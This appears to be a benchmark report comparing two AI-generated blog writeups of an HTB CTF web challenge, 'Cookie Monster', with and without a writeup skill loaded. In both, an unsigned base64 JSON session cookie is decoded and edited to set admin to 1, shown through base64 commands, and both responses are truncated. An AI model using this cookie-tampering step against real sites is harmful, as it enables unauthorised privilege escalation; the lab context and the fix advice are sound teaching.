---
skill: ctf-writeup
tested-on: claude-sonnet-4-6
date: 2026-05-22
---

# Benchmark: ctf-writeup
Real numbers. Same prompt. Same model. Skill on vs skill off.

## Results

| Metric | Without Skill | With Skill | Difference |
|--------|:-------------:|:----------:|:----------:|
| First-turn quality | Good | Complete | 🟢 +1 level(s) |
| Turns to complete | 1 | 1 | ⚪ 0 |
| Response tokens | ~741 | ~991 | 🔴 +34% |
| Total time | 16s | 23s | 🔴 +43% |
| User effort | Low | Low | ⚪ Low |

## Scenario

CTF player shares raw unstructured solve notes — needs a publishable writeup

## Without Skill — 1 turn required

The agent received the prompt with no skill loaded.

### Turn 1

**Prompt**

got the flag on cookie monster HTB CTF 2026 (web 300pts). basically the session cookie was just base64 of a JSON like {"user":"guest","admin":0}, i changed admin to 1, re-encoded in base64 and replaced the cookie in devtools. flag HTB{c00k13_m0nst3r_0wnd}

thought it was a JWT at first because of the base64 lol, wasted 30min before i noticed there was no dot in the token

make me a clean writeup for my blog

**Response**

# Cookie Monster — HTB CTF 2026 | Web (300pts)

---

## Challenge Overview

**Category:** Web
**Points:** 300
**Flag:** `HTB{c00k13_m0nst3r_0wnd}`

---

## Initial Recon

First thing I do on any web challenge is check the cookies. Opening DevTools (F12 → Application → Cookies), I spotted a session cookie that looked like this:

```
eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6MH0=
```

Base64-encoded, clearly. My first instinct was **JWT** since those are also base64 chunks — but I caught myself.

> **Key observation:** JWTs have three base64 segments separated by dots (`header.payload.signature`). This token had **no dots at all.**

That 30 minutes I spent assuming it was a JWT was a good reminder to slow down and actually look at the data before jumping to conclusions.

---

## Decoding the Cookie

Simple base64 decode:

```bash
echo "eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6MH0=" | base64 -d
```

Output:

```json
{"user":"guest","admin":0}
```

No signature. No HMAC. No integrity check whatsoever. The server was trusting whatever the client sent back — a textbook **client-side trust** vulnerability.

---

## Exploitation

The fix was trivial:

**1. Craft the modified payload:**

```json
{"user":"guest","admin":1}
```

**2. Base64 encode it:**

```bash
echo -n '{"user":"guest","admin":1}' | base64
```

```
eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6MX0=
```

**3. Replace the cookie value in DevTools:**

DevTools → Application → Cookies → double-click the value → paste → refresh.

Flag rendered on the page immediately.

---

## Root Cause

The application was rolling its own session system by base64-encoding a JSON object and storing it client-side with zero integrity verification. Base64 is **encoding, not encryption** — anyone can decode and re-encode it freely.

The correct implementation would be one of:

| Fix | How it helps |
|-----|-------------|
| HMAC-sign the cookie | Server detects any tampering |
| Use a server-side session store | Client only holds an opaque session ID |
| Use a prope

*[truncated]*

## With Skill — 1 turn, complete

Same prompt, with `ctf-writeup` loaded as system context.

### Turn 1

**Prompt**

got the flag on cookie monster HTB CTF 2026 (web 300pts). basically the session cookie was just base64 of a JSON like {"user":"guest","admin":0}, i changed admin to 1, re-encoded in base64 and replaced the cookie in devtools. flag HTB{c00k13_m0nst3r_0wnd}

thought it was a JWT at first because of the base64 lol, wasted 30min before i noticed there was no dot in the token

make me a clean writeup for my blog

**Response**

# Cookie Monster — HTB CTF 2026
**Category:** Web
**Points:** 300
**Difficulty:** Easy (organizer rating)
**Flag:** `HTB{c00k13_m0nst3r_0wnd}`

---

## Challenge Description

A web challenge with a login page and a protected admin area. Access to the admin panel was locked behind a session cookie.

*(Paste the original challenge description here if you have it.)*

---

## Initial Analysis

The first thing I did after logging in as a guest was check the network traffic and cookies in DevTools. The session cookie looked like this:

```
eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6MH0=
```

That trailing `=` padding and the alphanumeric character set immediately read as base64. My first instinct was **JWT** — they're base64url-encoded and everywhere in web challenges. I spent about 30 minutes down that road: checking for algorithm confusion, trying `none` attacks, looking for a weak secret to crack.

Then I noticed something that should have been obvious earlier: **there were no dots in the token.** JWTs are always three base64 segments separated by periods (`header.payload.signature`). This was a single blob. Not a JWT at all.

---

## Solution Walkthrough

**1. Decode the cookie**

Paste the cookie value into a base64 decoder (CyberChef, `base64 -d`, browser console — your choice):

```bash
echo "eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6MH0=" | base64 -d
```

Output:
```json
{"user":"guest","admin":0}
```

A raw JSON object. No signing, no HMAC, no integrity check of any kind. The server was trusting whatever the client sent back.

**2. Modify the payload**

Flip the `admin` field from `0` to `1`:

```json
{"user":"guest","admin":1}
```

**3. Re-encode to base64**

```bash
echo -n '{"user":"guest","admin":1}' | base64
```

Output:
```
eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6MX0=
```

The `-n` flag matters here — without it, `echo` adds a trailing newline that will corrupt the base64 output and produce a cookie the server won't parse correctly.

**4. Replace the cookie in DevTools**

Open DevTools

*[truncated]*

## What changed

Both completed in 1 turn, but the quality on that first turn differed: **Good** without the skill vs **Complete** with it. The skill enforces a consistent methodology from the first prompt.

Note: the SKILL.md adds context overhead on the input side (not shown above — response tokens are compared to keep the comparison fair). The trade-off is deliberate: more tokens in, fewer turns and better quality out.
